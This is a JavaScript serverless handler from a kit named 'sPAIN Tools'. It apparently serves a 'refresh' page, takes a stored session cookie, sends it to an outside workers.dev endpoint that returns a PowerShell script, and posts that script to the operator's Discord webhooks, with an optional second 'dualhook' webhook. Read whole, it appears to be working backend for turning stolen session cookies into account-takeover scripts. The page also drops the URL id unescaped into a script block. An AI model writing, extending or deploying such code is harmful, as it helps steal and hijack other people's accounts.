// api/refresh.js
// GET  /r/:id  → serve the HTML refresh page
// POST /r/:id  → regenerate PowerShell, send to Discord, return it
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    return r || null;
  } catch { return null; }
}

async function getPowerShell(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.success ? d.powershell : null;
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function sendPSToDiscord(webhookUrl, powershell, pageName) {
  await discordSend(webhookUrl, {
    embeds: [{
      title: `🔄 Fresh PowerShell — ${pageName}`,
      description: 'Regenerated just now. Run the command below.',
      color: 0x06b6d4,
      footer: { text: `sPAIN Tools • ${new Date().toISOString()}` }
    }]
  });
  let rem = powershell; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    const content = first
      ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
      : chunk + (rem.length > 0 ? '' : '\n```');
    await discordSend(webhookUrl, { content });
    first = false;
  }
}

function buildPage(id, state) {
  // state: 'ready' | 'success' | 'error' | 'notfound'
  const messages = {
    ready:    { text: 'Click the button to generate a fresh PowerShell for this account.', btn: 'Get Fresh PowerShell', color: '#00c8ff' },
    success:  { text: '✅ PowerShell sent to Discord! Check your webhook.', btn: 'Regenerate Again', color: '#22c55e' },
    error:    { text: '❌ Failed — cookie may be expired or worker is down.', btn: 'Try Again', color: '#ff3a5c' },
    notfound: { text: '❌ Refresh link not found or expired.', btn: null, color: '#ff3a5c' }
  };
  const m = messages[state] || messages.ready;

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sPAIN Tools — Refresh</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  :root { --bg:#03070f; --card:#060d1a; --accent:#00c8ff; --accent2:#0051ff; --text:#e8f4ff; --muted:#3a5a7a; --border:rgba(0,200,255,0.1); }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:var(--bg); color:var(--text); font-family:'Space Mono',monospace; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
  body::before { content:''; position:fixed; inset:0; background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,200,255,0.012) 2px,rgba(0,200,255,0.012) 4px); pointer-events:none; }
  .card { background:var(--card); border:1px solid var(--border); border-radius:4px; padding:44px 48px; width:100%; max-width:520px; position:relative; box-shadow:0 0 80px rgba(0,200,255,0.08); }
  .card::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,var(--accent2),var(--accent)); }
  .badge { display:inline-flex; align-items:center; gap:7px; background:rgba(0,200,255,0.08); border:1px solid rgba(0,200,255,0.2); border-radius:3px; padding:4px 12px; font-size:0.62rem; font-weight:700; letter-spacing:0.18em; text-transform:uppercase; color:var(--accent); margin-bottom:20px; }
  h1 { font-family:'Syne',sans-serif; font-size:1.9rem; font-weight:800; letter-spacing:-0.03em; margin-bottom:10px; }
  h1 span { color:var(--accent); }
  .msg { font-size:0.8rem; color:${m.color}; line-height:1.7; margin-bottom:32px; letter-spacing:0.02em; }
  .btn { width:100%; background:var(--accent); color:#03070f; border:none; padding:16px 0; border-radius:3px; font-family:'Syne',sans-serif; font-size:1rem; font-weight:800; letter-spacing:0.08em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 30px rgba(0,200,255,0.4); transition:transform 0.15s, box-shadow 0.15s; }
  .btn:hover { transform:translateY(-2px); box-shadow:0 0 50px rgba(0,200,255,0.65); }
  .btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
  .note { margin-top:16px; font-size:0.65rem; color:var(--muted); text-align:center; letter-spacing:0.06em; }
  .loader { display:none; margin-top:18px; text-align:center; font-size:0.7rem; color:var(--muted); letter-spacing:0.1em; }
</style>
</head>
<body>
<div class="card">
  <div class="badge">🔄 Refresh Session</div>
  <h1>s<span>PAIN</span> Tools</h1>
  <div class="msg">${m.text}</div>
  ${m.btn ? `<button class="btn" id="refreshBtn" onclick="doRefresh()">
    ${m.btn}
  </button>
  <div class="loader" id="loader">⏳ Generating PowerShell...</div>
  <div class="note">PowerShell will be sent to Discord automatically</div>` : ''}
</div>
<script>
const ID = '${id}';
async function doRefresh() {
  const btn = document.getElementById('refreshBtn');
  const loader = document.getElementById('loader');
  btn.disabled = true;
  btn.textContent = 'Working...';
  loader.style.display = 'block';
  try {
    const res = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: ID })
    });
    const data = await res.json();
    if (data.success) {
      btn.textContent = '✅ Sent to Discord!';
      btn.style.background = '#22c55e';
      btn.style.boxShadow = '0 0 30px rgba(34,197,94,0.5)';
      loader.textContent = '✅ Check your webhook channel now.';
      setTimeout(() => {
        btn.disabled = false;
        btn.textContent = 'Regenerate Again';
        btn.style.background = '';
        btn.style.boxShadow = '';
      }, 4000);
    } else {
      btn.textContent = '❌ Failed — Try Again';
      btn.style.background = '#ff3a5c';
      loader.textContent = data.error || 'Error. Cookie may be expired.';
      setTimeout(() => {
        btn.disabled = false;
        btn.textContent = 'Get Fresh PowerShell';
        btn.style.background = '';
      }, 3000);
    }
  } catch {
    btn.disabled = false;
    btn.textContent = 'Network Error — Try Again';
    loader.textContent = 'Check your connection.';
  }
}
</script>
</body>
</html>`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // Extract the refresh ID from the URL path: /r/:id
  const id = (req.url || '').replace(/^\/r\//, '').replace(/^\/api\/refresh\?.*/, '').split('?')[0].trim();
  const idFromQuery = new URL('http://x' + req.url).searchParams.get('id') || id;
  const refreshId = idFromQuery || id;

  if (!refreshId) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(400).send(buildPage('', 'notfound'));
  }

  // GET — serve the HTML page
  if (req.method === 'GET') {
    const record = await redisGet(`refresh:${refreshId}`);
    const state  = record ? 'ready' : 'notfound';
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(record ? 200 : 404).send(buildPage(refreshId, state));
  }

  // POST — regenerate PowerShell and send to Discord
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    const postId = (body?.id) || refreshId;

    const record = await redisGet(`refresh:${postId}`);
    if (!record) return res.status(404).json({ error: 'Refresh link not found or expired' });
    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });

    const powershell = await getPowerShell(record.cookie);
    if (!powershell) return res.status(502).json({ error: 'Worker failed — cookie may be expired' });

    // Send to Discord (both webhooks if dualhook)
    await Promise.all([
      sendPSToDiscord(record.webhook, powershell, record.pageName || 'unknown'),
      record.webhook1 && record.webhook1 !== record.webhook
        ? sendPSToDiscord(record.webhook1, powershell, record.pageName || 'unknown')
        : Promise.resolve()
    ]);

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
